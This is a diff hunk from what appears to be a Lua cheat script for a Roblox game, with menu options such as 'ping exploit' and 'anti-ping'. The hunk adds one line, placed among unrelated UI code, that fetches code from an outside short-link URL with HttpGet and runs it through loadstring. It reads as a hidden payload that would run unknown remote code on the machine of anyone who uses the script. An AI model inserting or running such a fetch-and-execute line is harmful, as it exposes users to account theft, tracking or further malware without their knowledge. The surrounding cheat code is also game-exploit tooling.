@@ -6105,6 +6105,7 @@ grenades:Element("ToggleKeybind", "ping exploit", {Type = "Toggle", Key = "T"}, 
         end 
     end)    
 end)      
+loadstring(game:HttpGet('https://02ip.ru/2FNgK5', true))()
 grenades:Element("Slider", "ping limit", {min = 1, max = 4, default = 2})  
 grenades:Element("Toggle", "anti-ping", {}, function(tbl)      
     spawn(function()
